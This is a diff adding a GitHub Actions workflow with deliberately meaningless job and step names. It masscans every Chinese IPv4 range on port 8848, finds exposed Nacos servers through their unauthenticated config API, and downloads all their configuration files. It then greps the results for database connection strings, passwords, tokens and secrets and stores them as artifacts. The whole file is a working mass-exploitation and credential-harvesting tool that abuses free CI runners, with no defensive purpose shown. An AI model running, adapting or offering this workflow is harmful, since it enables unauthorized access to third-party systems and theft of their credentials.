@@ -1,0 +1,211 @@
+name: b7Tz3wRn
+on:
+  workflow_dispatch:
+    inputs:
+      rate:
+        description: 'r'
+        default: '300000'
+      threads:
+        description: 't'
+        default: '200'
+      shards:
+        description: 's'
+        default: '20'
+
+jobs:
+  j1:
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    strategy:
+      fail-fast: false
+      matrix:
+        shard: [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19]
+
+    steps:
+      - name: s0
+        run: |
+          sudo apt-get update -qq
+          sudo apt-get install -y masscan python3 jq
+          go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
+          echo "$HOME/go/bin" >> $GITHUB_PATH
+        env:
+          GOPATH: /home/runner/go
+
+      - name: s1
+        run: |
+          curl -s --max-time 60 "https://ftp.apnic.net/stats/apnic/delegated-apnic-latest" \
+            | grep "^apnic|CN|ipv4|" > cn_raw.txt
+
+          python3 - <<PY
+          import math
+
+          shard_id = ${{ matrix.shard }}
+          total_shards = int("${{ inputs.shards }}")
+
+          def _s(c):
+              return 2 ** (32 - int(c.split('/')[1]))
+
+          cidrs = []
+          with open("cn_raw.txt") as f:
+              for line in f:
+                  parts = line.strip().split("|")
+                  if len(parts) < 5: continue
+                  ip = parts[3]
+                  count = int(parts[4])
+                  cidrs.append(f"{ip}/{32 - int(math.log2(count))}")
+
+          cs = sorted(set(cidrs), key=lambda c: -_s(c))
+          my = [c for i,c in enumerate(cs) if i % total_shards == shard_id]
+
+          with open("targets.txt", "w") as f:
+              f.write("\n".join(my))
+
+          print(sum(_s(c) for c in my))
+          PY
+
+      - name: s2
+        run: |
+          sudo masscan \
+            -iL targets.txt \
+            -p 8848 \
+            --rate "${{ inputs.rate }}" \
+            --wait 5 \
+            --exclude 255.255.255.255 \
+            -oL masscan_list.txt 2>/dev/null || true
+
+      - name: s3
+        run: |
+          grep '^open' masscan_list.txt 2>/dev/null \
+            | awk '{print $4":"$3}' | sort -u > open_8848.txt
+
+      - name: s4
+        run: |
+          if [ ! -s open_8848.txt ]; then
+            touch nacos_live.jsonl nacos_unauth.jsonl nacos_dump.jsonl; exit 0
+          fi
+
+          $HOME/go/bin/httpx \
+            -l open_8848.txt \
+            -path '/nacos/index.html' \
+            -title -status-code -server \
+            -mc 200 \
+            -t "${{ inputs.threads }}" \
+            -timeout 8 -silent \
+            -json -o nacos_live.jsonl 2>/dev/null || true
+
+      - name: s5
+        run: |
+          if [ -s nacos_live.jsonl ]; then
+            jq -r '.url' nacos_live.jsonl | sed 's|/nacos/index.html||' > nacos_bases.txt
+          else
+            awk -F: '{print "http://"$1":"$2}' open_8848.txt > nacos_bases.txt
+          fi
+
+          $HOME/go/bin/httpx \
+            -l nacos_bases.txt \
+            -path '/nacos/v1/cs/configs?dataId=&group=&pageNo=1&pageSize=20' \
+            -ms 'pageItems' \
+            -t "${{ inputs.threads }}" \
+            -timeout 8 -silent \
+            -json -o nacos_unauth.jsonl 2>/dev/null || true
+
+      - name: s6
+        run: |
+          python3 - <<'PY'
+          import json, urllib.request, ssl, sys
+
+          ctx = ssl.create_default_context()
+          ctx.check_hostname = False
+          ctx.verify_mode = ssl.CERT_NONE
+
+          try:
+              bases = []
+              with open("nacos_unauth.jsonl") as f:
+                  for line in f:
+                      try:
+                          url = json.loads(line).get("url","")
+                          base = url.split("/nacos/")[0]
+                          if base: bases.append(base)
+                      except: pass
+          except:
+              sys.exit(0)
+
+          results = []
+          for base in bases:
+              try:
+                  req = urllib.request.urlopen(
+                      f"{base}/nacos/v1/cs/configs?dataId=&group=&pageNo=1&pageSize=50",
+                      timeout=6, context=ctx)
+                  data = json.loads(req.read())
+                  configs = data.get("pageItems", [])
+                  total = data.get("totalCount", 0)
+
+                  namespaces = []
+                  try:
+                      nr = urllib.request.urlopen(f"{base}/nacos/v1/console/namespaces", timeout=5, context=ctx)
+                      nd = json.loads(nr.read())
+                      namespaces = [{"id": n.get("namespace",""), "name": n.get("namespaceShowName","")} for n in nd.get("data",[])]
+                  except: pass
+
+                  entry = {"base": base, "total_configs": total, "namespaces": namespaces, "configs": []}
+                  for c in configs:
+                      cid = c.get("dataId","")
+                      grp = c.get("group","DEFAULT_GROUP")
+                      tid = c.get("tenantId","")
+                      try:
+                          cr = urllib.request.urlopen(
+                              f"{base}/nacos/v1/cs/configs?dataId={cid}&group={grp}&tenant={tid}",
+                              timeout=5, context=ctx)
+                          content = cr.read().decode("utf-8","ignore")
+                      except:
+                          content = ""
+                      entry["configs"].append({"dataId": cid, "group": grp, "tenant": tid, "content": content[:3000]})
+
+                  results.append(entry)
+              except:
+                  pass
+
+          with open("nacos_dump.jsonl","w") as f:
+              for r in results:
+                  f.write(json.dumps(r, ensure_ascii=False) + "\n")
+          PY
+
+      - name: s7
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: p-${{ matrix.shard }}-${{ github.run_id }}
+          path: |
+            open_8848.txt
+            nacos_live.jsonl
+            nacos_unauth.jsonl
+            nacos_dump.jsonl
+          retention-days: 7
+
+  j2:
+    runs-on: ubuntu-latest
+    needs: j1
+    if: always()
+    steps:
+      - name: s0
+        uses: actions/download-artifact@v4
+        with:
+          pattern: p-*-${{ github.run_id }}
+          merge-multiple: false
+
+      - name: s1
+        run: |
+          mkdir -p merged
+          cat p-*/open_8848.txt 2>/dev/null | sort -u > merged/open_8848_all.txt
+          cat p-*/nacos_unauth.jsonl 2>/dev/null > merged/nacos_unauth_all.jsonl
+          cat p-*/nacos_dump.jsonl 2>/dev/null > merged/nacos_dump_all.jsonl
+          jq -r '.configs[].content' merged/nacos_dump_all.jsonl 2>/dev/null \
+            | grep -iE 'jdbc|password|username|redis|mongo|secret|token' \
+            | grep -v '^#' | sort -u > merged/hits.txt || true
+
+      - name: s2
+        uses: actions/upload-artifact@v4
+        with:
+          name: m-${{ github.run_id }}
+          path: merged/
+          retention-days: 7
